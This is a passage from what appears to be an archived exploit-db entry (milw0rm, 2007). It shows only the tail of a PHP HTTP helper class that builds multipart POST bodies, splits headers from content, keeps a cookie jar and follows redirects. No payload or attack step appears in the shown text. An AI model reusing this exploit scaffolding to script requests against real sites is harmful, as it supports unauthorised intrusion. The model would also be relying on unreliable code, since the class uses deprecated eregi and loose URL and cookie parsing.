\"\\r\\n\\r\\n\".$value.\"\\r\\n\";\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\t$this->data .= \" filename=\\\"\".$array[$key][frmdt_filename].\"\\\";\\r\\n\";\r\n\t\t\t\t\tif(isset($array[$key][frmdt_type])) $this->data .= \"Content-Type: \".$array[$key][frmdt_type].\"\\r\\n\";\r\n\t\t\t\t\tif(isset($array[$key][frmdt_transfert])) $this->data .= \"Content-Transfer-Encoding: \".$array[$key][frmdt_transfert].\"\\r\\n\";\r\n\t\t\t\t\t$this->data .= \"\\r\\n\".$array[$key][frmdt_content].\"\\r\\n\";\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\t$this->data .= \"-----------------------------\".$this->boundary.\"--\\r\\n\";\r\n\t\treturn $this->sock();\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function returns the content of the server response\r\n\t * without the headers.\r\n\t * \r\n\t * $this->getcontent($this->get(\"http://localhost/\"));\r\n\t * or\r\n\t * $this->getcontent();\r\n\t *\r\n\t * @param string $server_response\r\n\t * @return $onlythecontent\r\n\t */\r\n\tpublic function getcontent($code='')\r\n\t{\r\n\t\tif(empty($code)) $code = $this->recv;\r\n\t\t$content = explode(\"\\n\",$code);\r\n\t\t$onlycode = '';\r\n\t\tfor($i=1;$i<count($content);$i++)\r\n\t\t{\r\n\t\t\tif(!preg_match(\"/^(\\S*):/\",$content[$i])) $ok = 1;\r\n\t\t\tif($ok) $onlycode .= $content[$i].\"\\n\";\r\n\t\t}\r\n\t\treturn $onlycode;\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function returns the headers of the server response\r\n\t * without the content.\r\n\t * \r\n\t * $this->getheader($this->post(\"http://localhost/x.php\",\"x=1&z=2\"));\r\n\t * or\r\n\t * $this->getheader();\r\n\t *\r\n\t * @param string $server_response\r\n\t * @return $onlytheheaders\r\n\t */\r\n\tpublic function getheader($code='')\r\n\t{\r\n\t\tif(empty($code)) $code = $this->recv;\r\n\t\t$header = explode(\"\\n\",$code);\r\n\t\t$onlyheader = $header[0].\"\\n\";\r\n\t\tfor($i=1;$i<count($header);$i++)\r\n\t\t{\r\n\t\t\tif(!preg_match(\"/^(\\S*):/\",$header[$i])) break;\r\n\t\t\t$onlyheader .= $header[$i].\"\\n\";\r\n\t\t}\r\n\t\treturn $onlyheader;\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function is called by the cookiejar() function.\r\n\t * It adds the value of the \"Set-Cookie\" header in the \"Cookie\"\r\n\t * header for the next request. You don't have to call it.\r\n\t * \r\n\t * @param string $server_response\r\n\t */\r\n\tprivate function getcookie($code)\r\n\t{\r\n\t\t$carr = explode(\"\\n\",str_replace(\"\\r\\n\",\"\\n\",$code));\r\n\t\tfor($z=0;$z<count($carr);$z++)\r\n\t\t{\r\n\t\t\tif(preg_match(\"/set-cookie: (.*)/i\",$carr[$z],$cookarr))\r\n\t\t\t{\r\n\t\t\t\t$cookie[] = preg_replace(\"/expires=(.*)(GMT||UTC)(\\S*)$/i\",\"\",preg_replace(\"/path=(.*)/i\",\"\",$cookarr[1]));\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tfor($i=0;$i<count($cookie);$i++)\r\n\t\t{\r\n\t\t\tpreg_match(\"/(\\S*)=(\\S*)(|;)/\",$cookie[$i],$matches);\r\n\t    \t        $cookn = $matches[1];\r\n\t    \t        $cookv = $matches[2];\r\n\t    \t        $this->addcookie($cookn,$cookv);\r\n\t\t}\r\n    }\r\n\r\n\t\r\n\t/**\r\n\t * This function is called by the get()/post() functions.\r\n\t * You don't have to call it.\r\n\t *\r\n\t * @param string $urltarg\r\n\t */\r\n\tprivate function target($urltarg)\r\n\t{\r\n\t\tif(!preg_match(\"/^http:\\/\\/(.*)\\//\",$urltarg)) $urltarg .= \"/\";\r\n\t\t$this->url=$urltarg;\r\n\t\t\r\n\t\t$array = explode(\"/\",str_replace(\"http://\",\"\",preg_replace(\"/:(\\d+)/\",\"\",$urltarg)));\r\n\t\t$this->host=$array[0];\r\n\r\n\t\tpreg_match(\"/:(\\d+)\\//\",$urltarg,$matches);\r\n\t\t$this->port=empty($matches[1]) ? 80 : $matches[1];\r\n\t\t\r\n\t\t$temp = str_replace(\"http://\",\"\",preg_replace(\"/:(\\d+)/\",\"\",$urltarg));\r\n\t\tpreg_match(\"/\\/(.*)\\//\",$temp,$matches);\r\n\t\t$this->path=str_replace(\"//\",\"/\",\"/\".$matches[1].\"/\");\r\n\t\r\n\t\tif($this->port > 65535) die(\"Error: Invalid port number\");\r\n\t}\r\n\t\r\n\t\r\n\t/**\r\n\t * If you call this function, the script will\r\n\t * extract all \"Set-Cookie\" headers values\r\n\t * and it will automatically add them into the \"Cookie\" header\r\n\t * for all next requests.\r\n\t *\r\n\t * $this->cookiejar(1); // enabled\r\n\t * $this->cookiejar(0); // disabled\r\n\t * \r\n\t */\r\n\tpublic function cookiejar($code)\r\n\t{\r\n\t\tif($code===0) $this->cookiejar='';\r\n\t\tif($code===1) $this->cookiejar=1;\r\n\t\telse\r\n\t\t{\r\n\t\t\t$this->getcookie($code);\r\n\t\t}\r\n\t}\r\n\r\n\r\n\t/**\r\n\t * If you call this function, the script will\r\n\t * follow all redirections sent by the server.\r\n\t * \r\n\t * $this->allowredirection(1); // enabled\r\n\t * $this->allowredirection(0); // disabled\r\n\t * \r\n\t * @return $this->get($locationresponse)\r\n\t */\r\n\tpublic function allowredirection($code)\r\n\t{\r\n\t\tif($code===0) $this->allowredirection='';\r\n\t\tif($code===1) $this->allowredirection=1;\r\n\t\telse\r\n\t\t{\r\n\t\t\tif(preg_match(\"/(location|content-location|uri): (.*)/i\",$code,$codearr))\r\n\t\t\t{\r\n\t\t\t\t$location = str_replace(chr(13),'',$codearr[2]);\r\n\t\t\t\tif(!eregi(\"://\",$location))\r\n\t\t\t\t{\r\n\t\t\t\t\treturn $this->get(\"http://\".$this->host.$this->path.$location);\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\treturn $this->get($location);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\treturn $code;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\r\n\t\r\n\t/**\r\n\t * This function allows you to reset some parameters:\r\n\t * \r\n\t * $this->reset(header); // headers cleaned\r\n\t * $this->reset(cookie); // cookies cleaned\r\n\t * $this->reset();       // clean all parameters\r\n\t *\r\n\t * @param string $func\r\n\t */\r\n\tpublic function reset($func='')\r\n\t{\r\n\t\tswitch($func)\r\n\t\t{\r\n\t\t\tcase \"header\":\r\n\t\t\t$this->header='';\r\n\t\t\tbreak;\r\n\t\t\t\r\n\t\t\tcase \"cookie\":\r\n\t\t\t$this->cookie='';\r\n\t\t\tbreak;\r\n\t\t\t\r\n\t\t\tdefault:\r\n\t\t        $this->cookiejar='';\r\n\t\t        $this->header='';\r\n\t\t        $this->cookie='';\r\n\t\t        $this->allowredirection=''; \r\n\t\t        $this->agent='';\r\n\t\t        break;\r\n\t\t}\r\n\t}\r\n}\r\n?>\r\n\r\n# milw0rm.com [2007-04-03]",
  "url": "https://www.exploit-db.com/exploits/3653"
}